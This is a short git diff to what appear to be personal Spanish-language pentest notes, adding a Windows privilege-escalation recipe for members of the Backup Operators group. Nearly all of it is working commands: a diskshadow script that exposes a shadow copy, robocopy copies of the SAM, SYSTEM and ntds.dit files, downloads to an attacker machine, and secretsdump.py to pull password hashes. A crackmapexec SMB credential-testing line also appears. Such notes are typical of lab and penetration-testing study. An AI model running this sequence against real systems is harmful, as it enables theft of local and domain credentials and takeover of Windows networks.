@@ -24,4 +24,29 @@ crackmapexec smb <IP> -u <USUARIO/LISTA> -p <CONTRASEÑA>
 
 SIEMPRE HACER EN WINDOWS SI NO SE ENCUENTRA NADA --> ls -force para poder ver archivos ocultos
 
+### PRIVESC BACKUP OPERATORS ###
+
+echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
+echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
+echo "create" | out-file ./diskshadow.txt -encoding ascii -append        
+echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
+
+diskshadow.exe /s c:\temp\diskshadow.txt
+
+robocopy /b Z:\Windows\System32\Config C:\temp SAM
+robocopy /b Z:\Windows\System32\Config C:\temp SYSTEM
+
+download .\SAM /opt/Juggernaut/JUGG-Backup/SAM
+download .\SYSTEM /opt/Juggernaut/JUGG-Backup/SYSTEM
+
+secretsdump.py -sam SAM -system SYSTEM LOCAL
+
+En caso de que no funcione con la SAM deberemos usar en NTDS
+
+robocopy /b Z:\Windows\ntds . ntds.dit
+reg save hklm\system c:\temp\system.bak
+
+download ntds.dit
+download system
+
 
